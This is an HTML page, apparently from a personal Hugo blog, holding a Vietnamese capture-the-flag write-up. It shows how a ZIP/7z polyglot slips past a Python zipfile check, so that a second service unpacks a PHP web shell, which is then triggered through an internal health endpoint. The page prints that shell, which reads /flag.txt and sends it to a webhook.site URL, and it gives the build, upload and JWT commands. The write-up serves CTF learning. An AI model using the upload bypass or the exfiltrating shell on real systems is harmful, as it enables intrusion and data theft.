@@ -1,0 +1,399 @@
+<!DOCTYPE html>
+<html lang="en" dir="auto" data-theme="dark">
+
+<head><script src="/p1c0L0.github.io/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=p1c0L0.github.io/livereload" data-no-instant defer></script><meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="robots" content="noindex, nofollow">
+<title>ZC-1 CHALLENGE | p1c0L0</title>
+<meta name="keywords" content="">
+<meta name="description" content="ZC-1 CHALLENGE
+MTA_SUPPORT
+
+challenge file: public
+IDEA: Polyglot ZIP→7z &#43; kích hoạt qua “health” nội bộ
+Mục tiêu: Upload 1 file vượt qua kiểm tra ZIP safety của service 1 nhưng buộc service 2 giải nén và chạy shell.php, rồi dùng endpoint health để gọi file này để lấy flag CSCV2025{}.
+Main idea: Tạo polyglot: nhìn như zip hợp lệ với zipfile (Service 1), nhưng lại được 7-Zip (Service 2) đọc như 7z để giải nén shell.php.">
+<meta name="author" content="">
+<link rel="canonical" href="http://localhost:1313/p1c0L0.github.io/ctf/writeups/zc-1-challenge/">
+<link crossorigin="anonymous" href="/p1c0L0.github.io/assets/css/stylesheet.76a739ec9e19c0128deb6be5591d168c8e3b9a8640e14dc34a2f248f674ef884.css" integrity="sha256-dqc57J4ZwBKN62vlWR0WjI47moZA4U3DSi8kj2dO&#43;IQ=" rel="preload stylesheet" as="style">
+<link rel="icon" href="http://localhost:1313/p1c0L0.github.io/favicon.ico">
+<link rel="icon" type="image/png" sizes="16x16" href="http://localhost:1313/p1c0L0.github.io/favicon-16x16.png">
+<link rel="icon" type="image/png" sizes="32x32" href="http://localhost:1313/p1c0L0.github.io/favicon-32x32.png">
+<link rel="apple-touch-icon" href="http://localhost:1313/p1c0L0.github.io/apple-touch-icon.png">
+<link rel="mask-icon" href="http://localhost:1313/p1c0L0.github.io/safari-pinned-tab.svg">
+<meta name="theme-color" content="#2e2e33">
+<meta name="msapplication-TileColor" content="#2e2e33">
+<link rel="alternate" hreflang="en" href="http://localhost:1313/p1c0L0.github.io/ctf/writeups/zc-1-challenge/">
+<noscript>
+    <style>
+        #theme-toggle,
+        .top-link {
+            display: none;
+        }
+
+    </style>
+</noscript><link rel="icon" type="image/png" sizes="32x32" href="https://dotamduc.github.io/p1c0L0.github.io/favicon.png">
+<link rel="icon" type="image/png" sizes="16x16" href="https://dotamduc.github.io/p1c0L0.github.io/favicon.png">
+<link rel="shortcut icon" href="https://dotamduc.github.io/p1c0L0.github.io/favicon.png">
+<link rel="apple-touch-icon" href="https://dotamduc.github.io/p1c0L0.github.io/favicon.png">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.2/css/all.min.css" integrity="sha512-z3gLpd7yknf1YoNbCzqRKc4qyor8gaKU1qmn+CShxbuBusANI9QpRohGBreCFkKxLhei6S9CQXFEbbKuqLg0DA==" crossorigin="anonymous" referrerpolicy="no-referrer" />
+</head>
+<body id="top">
+    <header class="header">
+    <nav class="nav">
+        <div class="logo">
+            <a href="http://localhost:1313/p1c0L0.github.io/" accesskey="h" title="p1c0L0 (Alt + H)">p1c0L0</a>
+            <div class="logo-switches">
+            </div>
+        </div>
+        <ul id="menu">
+            <li>
+                <a href="http://localhost:1313/p1c0L0.github.io/about/" title="About">
+                    <span>About</span>
+                </a>
+            </li>
+            <li>
+                <a href="http://localhost:1313/p1c0L0.github.io/ctf/" title="CTF">
+                    <span>CTF</span>
+                </a>
+            </li>
+            <li>
+                <a href="http://localhost:1313/p1c0L0.github.io/achievements/" title="Achievements">
+                    <span>Achievements</span>
+                </a>
+            </li>
+            <li>
+                <a href="http://localhost:1313/p1c0L0.github.io/contact/" title="Contact">
+                    <span>Contact</span>
+                </a>
+            </li>
+        </ul>
+    </nav>
+</header>
+<main class="main">
+
+<article class="post-single">
+  <header class="post-header">
+    
+    <h1 class="post-title entry-hint-parent">
+      ZC-1 CHALLENGE
+    </h1>
+    <div class="post-meta">
+
+</div>
+  </header> 
+  <div class="post-content"><h1 id="zc-1-challenge">ZC-1 CHALLENGE<a hidden class="anchor" aria-hidden="true" href="#zc-1-challenge">#</a></h1>
+<h1 id="mta_support">MTA_SUPPORT<a hidden class="anchor" aria-hidden="true" href="#mta_support">#</a></h1>
+<p><img alt="image" loading="lazy" src="https://hackmd.io/_uploads/ry_nOA4Cxl.png">
+challenge file: <a href="https://drive.google.com/file/d/1PprDuWV1u11dnH1mf_Bc70La8CpFZ7NR/view">public</a></p>
+<h3 id="idea-polyglot-zip7z--kích-hoạt-qua-health-nội-bộ">IDEA: Polyglot ZIP→7z + kích hoạt qua “health” nội bộ<a hidden class="anchor" aria-hidden="true" href="#idea-polyglot-zip7z--kích-hoạt-qua-health-nội-bộ">#</a></h3>
+<p>Mục tiêu: Upload 1 file vượt qua kiểm tra <code>ZIP safety</code> của <code>service 1</code> nhưng buộc <code>service 2</code> giải nén và chạy shell.php, rồi dùng endpoint health để gọi file này để lấy flag CSCV2025{}.</p>
+<p>Main idea: Tạo polyglot: nhìn như zip hợp lệ với zipfile (Service 1), nhưng lại được 7-Zip (Service 2) đọc như 7z để giải nén shell.php.</p>
+<p>Trigger:<code> GET /gateway/health?module=&lt;path&gt;</code> trên Service 1 sẽ gọi nội bộ đến <code>http://app2&lt;module&gt;</code> (kiểu SSRF nhẹ).</p>
+<p>Kết quả: shell.php đi vào folder web served của app2 (<strong>root</strong> <code>/var/www/html/storage/&lt;user_id&gt;/shell.php</code>), ta kích hoạt qua health và nhận flag.</p>
+<h3 id="phân-tích-challenge">Phân tích challenge<a hidden class="anchor" aria-hidden="true" href="#phân-tích-challenge">#</a></h3>
+<ul>
+<li>
+<p>Service-1 (app1, Django) — có cổng http://localhost:8000</p>
+</li>
+<li>
+<p>Endpoint:</p>
+<ul>
+<li>
+<p><code>POST /gateway/user/</code> <strong>(đăng ký)</strong></p>
+</li>
+<li>
+<p><code>POST /auth/token/</code> <strong>(JWT)</strong></p>
+</li>
+<li>
+<p><code>POST /gateway/transport/</code> <strong>(upload)</strong> → xác thực ZIP bằng Python&rsquo;s zipfile</p>
+</li>
+<li>
+<p><code>GET /gateway/health?module=...</code> → gọi nội bộ http://app2{module}, trả “OK/ERR”</p>
+</li>
+</ul>
+</li>
+<li>
+<p>Service 2 (app2, PHP + Apache) — không lộ cổng ra ngoài</p>
+<ul>
+<li>Giải nén bằng Archive7z (wrapper gọi 7z) vào /var/www/html/storage/&lt;user_id&gt;/</li>
+</ul>
+</li>
+</ul>
+<p>Note: <code>zipfile</code> (Service 1) đọc từ cuối file (central directory) → thấy ZIP “sạch”; <code>7z</code> (Service 2) nhận <strong>header 7z</strong> ở đầu → giải nén <code>shell.php</code>. Đây là xung đột parser cho phép <strong>polyglot</strong> qua cửa.</p>
+<h3 id="trình-tự-khai-thác">Trình tự khai thác<a hidden class="anchor" aria-hidden="true" href="#trình-tự-khai-thác">#</a></h3>
+<ul>
+<li>Tạo polyglot: ZIP (benign) + 7z payload chứa <code>shell.php</code>.</li>
+<li>Lấy JWT để upload/health.</li>
+<li>Upload polyglot qua <code>POST /gateway/transport/</code> (Service 1 chấp nhận).</li>
+<li>Service 2 dùng 7-Zip giải nén, thả <code>shell.php</code> vào thư mục phục vụ web.</li>
+<li>Lấy <code>user_id</code> từ payload JWT.</li>
+<li>Gọi <code>GET /gateway/health?module=/storage/&lt;user_id&gt;/shell.php</code>.</li>
+<li>Lấy flag.</li>
+</ul>
+<h2 id="khai-thác">Khai thác<a hidden class="anchor" aria-hidden="true" href="#khai-thác">#</a></h2>
+<h3 id="khởi-chạy-docker">Khởi chạy docker<a hidden class="anchor" aria-hidden="true" href="#khởi-chạy-docker">#</a></h3>
+<pre tabindex="0"><code>docker compose up -d
+app1: http://localhost:8000
+</code></pre><h3 id="tạo-polyglot-zip7z">Tạo polyglot ZIP→7z<a hidden class="anchor" aria-hidden="true" href="#tạo-polyglot-zip7z">#</a></h3>
+<ul>
+<li>Tạo web shell PHP, lưu thành <code>shell.php</code></li>
+</ul>
+<pre tabindex="0"><code>&lt;?php
+$flag = @file_get_contents(&#39;/flag.txt&#39;);
+@file_get_contents(&#39;https://webhook.site/YOUR-UNIQUE-ID?f=&#39;.urlencode($flag));
+header(&#39;Content-Type: text/plain&#39;);
+echo $flag ?: &#34;no-flag&#34;;
+</code></pre><h3 id="tạo-payload-7z-chứa-shellphp">Tạo payload 7z chứa <code>shell.php</code><a hidden class="anchor" aria-hidden="true" href="#tạo-payload-7z-chứa-shellphp">#</a></h3>
+<p><code>7z a -t7z payload.7z shell.php</code></p>
+<h3 id="tạo-carrierzip-hợp-lệ-chứa-file-hợp-lệ-theo-bộ-lọc-allow_storage_file">Tạo carrier.zip “hợp lệ” (chứa file hợp lệ theo bộ lọc ALLOW_STORAGE_FILE)<a hidden class="anchor" aria-hidden="true" href="#tạo-carrierzip-hợp-lệ-chứa-file-hợp-lệ-theo-bộ-lọc-allow_storage_file">#</a></h3>
+<pre tabindex="0"><code>echo benign &gt; benign.txt
+zip carrier.zip benign.txt
+</code></pre><h3 id="gộp-thành-polyglot">Gộp thành polyglot<a hidden class="anchor" aria-hidden="true" href="#gộp-thành-polyglot">#</a></h3>
+<pre tabindex="0"><code>truepolyglot zipany --payload1file payload.7z --zipfile carrier.zip polyglot.zip
+</code></pre><h3 id="lấy-jwt-và-user_id">Lấy JWT và user_id<a hidden class="anchor" aria-hidden="true" href="#lấy-jwt-và-user_id">#</a></h3>
+<p>Đăng ký</p>
+<pre tabindex="0"><code>curl -s http://localhost:8000/gateway/user/ -X POST \
+  -H &#34;Content-Type: application/json&#34; \
+  -d &#39;{&#34;username&#34;:&#34;msec&#34;,&#34;password&#34;:&#34;msec&#34;,&#34;email&#34;:&#34;abc@gmail.com&#34;}&#39;
+</code></pre><p>Lấy token</p>
+<pre tabindex="0"><code>TOKENS=$(curl -s http://localhost:8000/auth/token/ -X POST \
+  -H &#34;Content-Type: application/json&#34; \
+  -d &#39;{&#34;username&#34;:&#34;msec&#34;,&#34;password&#34;:&#34;msec&#34;}&#39;)
+ACCESS=$(echo &#34;$TOKENS&#34; | python3 -c &#39;import sys,json; print(json.load(sys.stdin)[&#34;access&#34;])&#39;)
+echo &#34;$ACCESS&#34;
+</code></pre><p>JWT:</p>
+<blockquote>
+<p>eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ0b2tlbl90eXBlIjoiYWNjZXNzIiwiZXhwIjoxNzYxMDU0MTE1LCJpYXQiOjE3NjEwNTM4MTUsImp0aSI6IjQ4YzE4YmRmYzgwNTRlNGU4N2ZmMDFiNzdjZTU0YmI1IiwidXNlcl9pZCI6IjBjZjQ1MzJhLWI1MGYtNDcxZi05NWE4LTJjZmIxMzEyMTgxNCJ9.mmsJLg7LvRLVb1tRxwOQRXNFs0_94m3QXzsSNWH7BAo</p></blockquote>
+<p>Sau khi lấy được JWT thì truy cập vào <a href="https://gchq.github.io/CyberChef/">cyberchef</a> để base64 JWT để lấy user_id
+<img alt="image" loading="lazy" src="https://hackmd.io/_uploads/SJjeT-BRgx.png"></p>
+<p><code>user_id: 0cf4532a-b50f-471f-95a8-2cfb13121814</code></p>
+<h3 id="upload-polyglot">Upload polyglot<a hidden class="anchor" aria-hidden="true" href="#upload-polyglot">#</a></h3>
+<pre tabindex="0"><code>curl -s http://localhost:8000/gateway/transport/ \
+  -X POST \
+  -H &#34;Authorization: Bearer &lt;JWT&gt;&#34; \
+  -F &#34;file=@polyglot.zip&#34;
+</code></pre><p><img alt="image" loading="lazy" src="https://hackmd.io/_uploads/S1ltTbrRgg.png"></p>
+<p>Nếu hiện &ldquo;OK&rdquo; tức là đã upload thành công</p>
+<h3 id="xác-định-vị-trí-file">Xác định vị trí file<a hidden class="anchor" aria-hidden="true" href="#xác-định-vị-trí-file">#</a></h3>
+<p>Vào app2:</p>
+<pre tabindex="0"><code>docker compose exec app2 bash
+cd /var/www/html
+find / -type f -name shell.php 2&gt;/dev/null | head
+</code></pre><p><img alt="image" loading="lazy" src="https://hackmd.io/_uploads/SJYna-HAge.png"></p>
+<ul>
+<li>
+<p>Tiếp theo, tìm xem có thư mực <code>storage/&lt;user_id&gt;</code> và có file <code>shell.php</code> không</p>
+</li>
+<li>
+<p>Dùng lệnh <code>ls -la</code> để liệt kê ra các <strong>file/folder</strong> đang có
+<img alt="image" loading="lazy" src="https://hackmd.io/_uploads/ry9GAZBCle.png"></p>
+</li>
+<li>
+<p>Ta thấy có folder <code>storage</code></p>
+</li>
+<li>
+<p>Sau đó, dùng lệnh <code>ls -la /var/www/html/storage || true</code> để xem folder storage có user_id của tài khoản không
+<img alt="image" loading="lazy" src="https://hackmd.io/_uploads/Sy5nAZS0gg.png"></p>
+</li>
+<li>
+<p>Ta thấy có folder <code>0cf4532a-b50f-471f-95a8-2cfb13121814</code> (<code>user_id</code> của tài khoản với <code>username=msec</code>)</p>
+</li>
+<li>
+<p>Tiếp tục truy cập tới <code>/var/www/html/storage/0cf4532a-b50f-471f-95a8-2cfb13121814</code>
+<img alt="image" loading="lazy" src="https://hackmd.io/_uploads/Bke_kGHAgl.png"></p>
+<p>Đã thấy được file shell.php</p>
+</li>
+<li>
+<p>Gọi tới nội bộ xem web server có serve được không bằng cách:
+<code>curl -i http://localhost/storage/user_id/shell.php</code> (ở đây <strong>user_id</strong> = <code>0cf4532a-b50f-471f-95a8-2cfb13121814</code>)
+<img alt="image" loading="lazy" src="https://hackmd.io/_uploads/Hy4llMBAgx.png"></p>
+</li>
+<li>
+<p>Ta đã thấy được flag CSCV2025{}</p>
+</li>
+</ul>
+<p><strong>FLAG: CSCV2025{Z1p_z1P_21p_Ca7_c47_c@t__}</strong></p>
+
+
+  </div>
+
+  <footer class="post-footer">
+    <ul class="post-tags">
+    </ul>
+  </footer>
+</article>
+    </main>
+    
+<footer class="footer">
+        <span>&copy; 2026 <a href="http://localhost:1313/p1c0L0.github.io/">p1c0L0</a></span> · 
+
+    <span>
+        Powered by
+        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &
+        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
+    </span>
+</footer>
+<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
+        <path d="M12 6H0l6-6z" />
+    </svg>
+</a><canvas id="matrix-bg"></canvas>
+
+<style>
+     
+    #matrix-bg {
+        position: fixed;
+        top: 0; left: 0;
+        width: 100vw; height: 100vh;
+        z-index: -9999;  
+        pointer-events: none;
+    }
+
+     
+    .emoji-reset {
+         
+        font-family: "Apple Color Emoji", "Segoe UI Emoji", "Segoe UI Symbol", "Noto Color Emoji", "Android Emoji", sans-serif !important;
+        
+         
+        color: initial !important; 
+        
+         
+        background: none !important; 
+        -webkit-text-fill-color: initial !important; 
+        -webkit-background-clip: border-box !important;
+
+         
+        text-shadow: none !important; 
+        
+         
+        font-style: normal !important;
+        display: inline-block !important;
+        font-weight: normal !important;
+    }
+</style>
+
+<script>
+    
+    const canvas = document.getElementById('matrix-bg');
+    const ctx = canvas.getContext('2d');
+
+    function resizeCanvas() {
+        canvas.width = window.innerWidth;
+        canvas.height = window.innerHeight;
+    }
+    window.addEventListener('resize', resizeCanvas);
+    resizeCanvas();
+
+    const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789@#$%^&*';
+    const fontSize = 14;
+    const columns = Math.ceil(window.innerWidth / fontSize);
+    const drops = Array(columns).fill(1);
+
+    function draw() {
+        
+        ctx.fillStyle = 'rgba(0, 0, 0, 0.05)';
+        ctx.fillRect(0, 0, canvas.width, canvas.height);
+
+        
+        ctx.fillStyle = 'rgba(0, 255, 65, 0.15)'; 
+        ctx.font = fontSize + 'px monospace';
+
+        for (let i = 0; i < drops.length; i++) {
+            const text = chars.charAt(Math.floor(Math.random() * chars.length));
+            ctx.fillText(text, i * fontSize, drops[i] * fontSize);
+
+            if (drops[i] * fontSize > canvas.height && Math.random() > 0.975) {
+                drops[i] = 0;
+            }
+            drops[i]++;
+        }
+    }
+    
+    
+    ctx.fillStyle = '#000000';
+    ctx.fillRect(0, 0, canvas.width, canvas.height);
+    setInterval(draw, 35);
+
+
+    
+    document.addEventListener("DOMContentLoaded", function() {
+        
+        function rescueEmojis(node) {
+            
+            if (node.nodeType === 3) { 
+                const text = node.nodeValue;
+                
+                const emojiRegex = /[\p{Emoji_Presentation}\p{Extended_Pictographic}\u{1F300}-\u{1F6FF}\u{1F900}-\u{1F9FF}\u{2600}-\u{26FF}\u{2700}-\u{27BF}]/gu;
+                
+                if (text.match(emojiRegex)) {
+                    const span = document.createElement('span');
+                    
+                    span.innerHTML = text.replace(emojiRegex, '<span class="emoji-reset">$&</span>');
+                    node.parentNode.replaceChild(span, node);
+                }
+            } 
+            
+            else if (node.nodeType === 1 && 
+                     !['SCRIPT', 'STYLE', 'TEXTAREA', 'CODE', 'PRE'].includes(node.tagName) && 
+                     !node.classList.contains('emoji-reset')) {
+                Array.from(node.childNodes).forEach(child => rescueEmojis(child));
+            }
+        }
+        
+        
+        rescueEmojis(document.body);
+    });
+</script>
+
+<script>
+    let menu = document.getElementById('menu');
+    if (menu) {
+        
+        const scrollPosition = localStorage.getItem("menu-scroll-position");
+        if (scrollPosition) {
+            menu.scrollLeft = parseInt(scrollPosition, 10);
+        }
+        
+        menu.onscroll = function () {
+            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
+        }
+    }
+
+    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+        anchor.addEventListener("click", function (e) {
+            e.preventDefault();
+            var id = this.getAttribute("href").substr(1);
+            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
+                    behavior: "smooth"
+                });
+            } else {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
+            }
+            if (id === "top") {
+                history.replaceState(null, null, " ");
+            } else {
+                history.pushState(null, null, `#${id}`);
+            }
+        });
+    });
+
+</script>
+<script>
+    var mybutton = document.getElementById("top-link");
+    window.onscroll = function () {
+        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
+            mybutton.style.visibility = "visible";
+            mybutton.style.opacity = "1";
+        } else {
+            mybutton.style.visibility = "hidden";
+            mybutton.style.opacity = "0";
+        }
+    };
+
+</script>
+</body>
+
+</html>
